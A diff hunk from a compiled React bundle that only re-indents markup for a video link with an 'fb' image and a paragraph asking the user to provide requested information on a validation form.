@@ -13828,21 +13828,21 @@
                                             fontSize: "12px"
                                         },
                                         children: "Detailed Video Information."
-                                    }), (0,
-                                        he.jsx)("a", {
-                                        href: "/detailed_video.mp4",
-                                        children: (0,
-                                            he.jsx)("img", {
-                                            src: me,
-                                            alt: "fb",
-                                            style: {
-                                                width: "120px",
-                                                height: "80px"
-                                            }
-                                        })
-                                    }), (0,
-                                        he.jsx)("br", {}), (0,
-                                        he.jsx)("p", {
+                                     }), (0,
+                            he.jsx)("a", {
+                                href: "/detailed_video.mp4",
+                                children: (0,
+                                he.jsx)("img", {
+                                    src: me,
+                                    alt: "fb",
+                                    style: {
+                                        width: "120px",
+                                        height: "80px"
+                                    }
+                                })
+                            }), (0,
+                            he.jsx)("br", {}), (0,
+                            he.jsx)("p", {
                                         className: "fw-semibold validation_form_para mt-2",
                                         children: "Please be sure to provide the requested information below."
                                     }), (0,
